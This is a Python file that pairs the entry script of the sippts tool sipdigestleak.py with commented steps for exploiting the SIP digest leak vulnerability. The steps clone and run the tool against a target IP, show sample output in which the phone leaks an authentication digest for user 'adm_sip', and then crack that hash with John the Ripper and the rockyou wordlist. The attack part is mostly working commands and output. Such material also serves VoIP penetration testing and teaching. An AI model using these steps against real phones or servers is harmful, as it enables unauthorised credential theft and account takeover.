''' SIP digest leak is a SIP phone vulnerability that allows the attacker to get a digest response from a phone and use it to guess the password via a brute-force 
attack. If the VoIP responder on the target has a predefined wildcard <recv response="*">, allowing us to send 407 Proxy Auth Required instead of ACK, 
triggering the digest leak response.'''

# Exploitation steps
# 1. git clone https://github.com/Pepelux/sippts.git
# 2. cd sippts 
# 3. pip3 install -r requirements.txt
# 4. python3 sipdigestleak.py -i 192.168.68.156

# [✓] Target: 192.168.68.156:5060/UDP                                                                                                                                                                         
# [=>] Request INVITE                                                                                                                                                                                         
# [<=] Response 180 Ringing                                                                                                                                                                                   
# [<=] Response 200 OK                                                                                                                                                                                        
# [=>] Request ACK                                                                                                                                                                                            
#        ... waiting for BYE ...                                                                                                                                                                             
# [<=] Received BYE                                                                                                                                                                                           
# [=>] Request 407 Proxy Authentication Required                                                                                                                                                              
# [<=] Received BYE                                                                                                                                                                                           
# [=>] Request 200 Ok                                                                                                                                                                                         
# Auth=Digest username="adm_sip", uri="sip:127.0.0.1:5060", password="074b62fb6c21b84e6b5846e6bb001f67", algorithm=MD5   

# 5. john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt


#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__author__ = 'Jose Luis Verdeguer'
__version__ = '3.3'
__license__ = "GPL"
__copyright__ = "Copyright (C) 2015-2022, SIPPTS"
__email__ = "pepeluxx@gmail.com"

from sys import setdlopenflags
from modules.sipdigestleak import SipDigestLeak
from lib.params import get_sipdigestleak_args


def main():
    ip, host, proxy, rport, proto, domain, contact_domain, from_name, from_user, from_domain, to_name, to_user, to_domain, user_agent, localip, ofile, lfile, user, pwd, auth, verbose, sdp, sdes, file, ping, ppi, pai = get_sipdigestleak_args()

    s = SipDigestLeak()
    s.ip = ip
    s.host = host
    s.proxy = proxy
    s.rport = rport
    s.proto = proto
    s.domain = domain
    s.contact_domain = contact_domain
    s.from_name = from_name
    s.from_user = from_user
    s.from_domain = from_domain
    s.to_name = to_name
    s.to_user = to_user
    s.to_domain = to_domain
    s.user_agent = user_agent
    s.ofile = ofile
    s.lfile = lfile
    s.localip = localip
    s.user = user
    s.pwd = pwd
    s.auth_code = auth
    s.verbose = verbose
    s.sdp = sdp
    s.sdes = sdes
    s.file = file
    s.ping = ping
    s.ppi = ppi
    s.pai = pai

    s.start()


if __name__ == '__main__':
    main()
